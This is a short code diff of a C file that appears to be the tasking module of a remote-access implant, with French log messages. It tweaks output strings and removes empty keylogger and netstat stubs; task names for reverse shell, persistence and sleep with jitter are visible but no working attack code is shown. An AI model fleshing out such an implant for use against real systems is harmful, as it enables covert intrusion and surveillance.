@@ -89,7 +89,7 @@ void task_sleep(char *sleep_time_str, char *jitter_str) {
         char *decoded_jitter = decode(jitter_str);
         if (decoded_jitter != NULL) {
             jitter = atof(decoded_jitter);
-            printf("Jitter: %.2f%%\n", jitter);
+            printf("Jitter : %.2f%%\n", jitter);
             free(decoded_jitter);
         }
     }
@@ -118,6 +118,7 @@ void task_locate(const char *id_task) {
     char *encoded_result = encode(result_buffer);
     if (encoded_result == NULL) {
         printf("Erreur d'encodage en base64\n");
+        printf("Tâche annulée\n");
         return;
     }
 
@@ -144,11 +145,6 @@ void task_revshell() {
     return;
 }
 
-void task_keylog() {
-    printf("Exécution de la tâche keylog\n");
-    // Implémentation à faire
-    return;
-}
 
 void task_persist() {
     printf("Exécution de la tâche persist\n");
@@ -180,8 +176,3 @@ void task_ps() {
     return;
 }
 
-void task_netstat() {
-    printf("Exécution de la tâche netstat\n");
-    // Implémentation à faire
-    return;
-}
